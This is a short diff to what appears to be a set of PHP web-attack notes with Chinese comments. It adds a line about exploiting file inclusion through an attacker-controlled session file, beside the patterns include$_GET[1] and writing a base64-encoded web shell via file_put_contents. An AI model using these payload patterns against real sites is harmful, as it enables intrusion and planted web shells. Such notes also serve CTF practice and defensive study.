@@ -71,6 +71,7 @@ die("...");
 
 // 文件包含漏洞
 include$_GET[1];             // 中間空格可以省略
+include /var/lib/php/sessions/sess_xxxxx  // session內容可控的情況
 
 // 思路：寫入base64編碼過的shell檔，再進行解碼  <環境www>
 $_GET[1](file,chracter,8);&1=file_put_contents .....
